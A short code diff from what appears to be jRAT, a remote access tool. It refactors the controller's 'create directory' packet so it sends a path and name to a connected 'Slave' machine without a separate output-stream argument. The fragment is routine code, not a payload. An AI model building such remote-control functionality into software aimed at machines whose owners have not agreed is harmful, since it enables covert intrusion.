@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 
 public class Packet43CreateDirectory extends AbstractOutgoingPacket {
 
@@ -16,7 +14,7 @@ public class Packet43CreateDirectory extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
+	public void write(Slave slave) throws Exception {
 		slave.writeLine(dir);
 		slave.writeLine(name);
 	}
